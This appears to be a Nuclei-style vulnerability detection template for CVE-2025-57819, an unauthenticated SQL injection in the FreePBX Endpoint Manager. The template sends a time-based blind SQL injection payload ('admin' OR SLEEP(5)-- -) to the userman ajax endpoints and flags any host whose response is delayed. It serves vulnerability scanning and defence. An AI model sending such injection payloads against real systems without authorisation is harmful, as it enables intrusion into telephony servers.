id: CVE-2025-57819

info:
  name: FreePBX Endpoint Manager - Unauthenticated SQL Injection to RCE
  author: rxerium, chatgpt
  severity: critical
  description: |
    FreePBX 15 (<15.0.66), 16 (<16.0.89), and 17 (<17.0.3) contain an unauthenticated SQL injection in the Endpoint Manager.
    This vulnerability allows attackers to execute arbitrary SQL queries and gain remote code execution by writing PHP files to disk.
    Detection is performed via a time-based blind SQL injection on the userman module endpoints.
  reference:
    - https://github.com/net-hex/CVE-2025-57819
    - https://github.com/blueisbeautiful/CVE-2025-57819
    - https://github.com/Sucuri-Labs/CVE-2025-57819-ioc-check
    - https://community.freepbx.org/t/endpointmanager-aug-2025-zero-day/107215
    - https://www.bleepingcomputer.com/news/security/freepbx-servers-hacked-via-zero-day-emergency-fix-released/
  tags: freepbx,sangoma,rce,sqli,unauth

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/ajax.php?module=userman&command=checkPasswordReminder"
      - "{{BaseURL}}/ucp/ajax.php?module=userman&command=checkPasswordReminder"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "username=admin' OR SLEEP(5)-- -&password=test"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - duration>=5
        condition: and

    extractors:
      - type: regex
        part: body
        name: response
        regex:
          - ".*"
